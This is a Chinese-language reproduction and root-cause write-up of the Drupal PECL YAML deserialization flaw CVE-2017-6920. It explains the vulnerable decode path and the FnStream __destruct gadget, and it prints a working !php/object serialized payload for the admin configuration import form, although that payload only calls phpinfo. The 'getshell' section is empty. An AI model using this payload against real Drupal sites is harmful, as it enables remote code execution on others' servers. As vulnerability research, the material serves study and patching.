Drupal PECL YAML parser 远程代码执行漏洞(CVE-2017-6920)

复现

phpinfo

  1. 搭建好环境，服务开放于http://45.32.74.108:8000

  2. 序列化一个GuzzleHttp\Psr7\FnStream类, 并给该序列化字符串加上yaml的!php/object

    !php/object "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\0GuzzleHttp\\Psr7\\FnStream\0methods\";a:1:{s:5:\"close\";s:7:\"phpinfo\";}s:9:\"_fn_close\";s:7:\"phpinfo\";}"
  1. 登陆一个管理员账号，访问 http://127.0.0.1:8000/admin/config/development/configuration/single/import
  2. 填写表单
  3. 点击import即可触发

getshell

原理

对比Drupal的8.3.3和8.3.4版本，发现主要有四个文件做了改动：




漏洞点在/Drupal/Component/Serialization/YamlPecl.php的decode函数中

public static function decode($raw) {
  // yaml_parse() will error with an empty value.
  if (!trim($raw)) {
    return NULL;
  }
  set_error_handler([__CLASS__, 'errorHandler']);
  $ndocs = 0;
  $data = yaml_parse($raw, 0, $ndocs, [
    YAML_BOOL_TAG => '\Drupal\Component\Serialization\YamlPecl::applyBooleanCallbacks',
  ]);
  restore_error_handler();
  return $data;
}

参数$raw被带入yaml_parse函数中，其中$raw可控，在文档中有一个特别声明：

Warning Processing untrusted user input with yamlparse() is dangerous if the use of unserialize() is enabled for nodes using the !php/object tag. This behavior can be disabled by using the yaml.decodephp ini setting.

因此可以通过!php/object声明一个节点，然后用这个节点内容以unserialize的方式处理。找到调用这个YamlPecl::decode函数的地方：

public static function decode($raw) {
   $serializer = static::getSerializer();
   return $serializer::decode($raw);
 }

 protected static function getSerializer() {
   if (!isset(static::$serializer)) {
     if (extension_loaded('yaml')) {
       static::$serializer = YamlPecl::class;
     }
     else {
       // Otherwise, fallback to the Symfony implementation.
       static::$serializer = YamlSymfony::class;
     }
   }
   return static::$serializer;
 }

这里会检测是否加载了Yaml的插件，如果加载插件则会调用到危险函数。找调用了Yaml::decode函数的外部可控点，在/core/modules/config/src/Form/ConfigSingleImportForm.php中第280行：

public function validateForm(array &$form, FormStateInterface $form_state) { // The confirmation step needs no additional validation. if ($this->data) { return; }
try {
  // Decode the submitted import.
  $data = Yaml::decode($form_state->getValue('import'));
}
catch (InvalidDataTypeException $e) {
  $form_state->setErrorByName('import', $this->t('The import failed with the following message: %message', ['%message' => $e->getMessage()]));
}

到这里已经找到了触发PHP反序列化的函数和可控点，只需找到能够反序列化执行函数或写文件的类即可，全局搜索__destruct和__weakup,在/vendor/guzzlehttp/psr7/src/FnStream.php中第48行中能够找到执行无参函数的漏洞点

public function __destruct() { 
if (isset($this->_fn_close)) { call_user_func($this->_fn_close); } 
}

因此构造出Payload：

!php/object "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\0GuzzleHttp\\Psr7\\FnStream\0methods\";a:1:{s:5:\"close\";s:7:\"phpinfo\";}s:9:\"_fn_close\";s:7:\"phpinfo\";}"

关于Yaml插件安装

下载插件后进入目录：

$ phpize
$ ./configure
$ make
$ make install

若成功则会返回编译好的扩展所在目录，在php.ini中修改extension_dir=[这个目录]，再设置extension=yaml.so即可

阿斯顿发

yaml_parse函数：将部分或所有的YAML文档流转换成PHP对象
mixed yaml_parse ( string $input [, int $pos = 0 [, int &$ndocs [, array $callbacks ]]] )

input
The string to parse as a YAML document stream.
pos
Document to extract from stream (-1 for all documents, 0 for first document, ...).
ndocs
If ndocs is provided, then it is filled with the number of documents found in stream.
callbacks
Content handlers for YAML nodes. Associative array of YAML tag => callable mappings. See parse callbacks for more details.
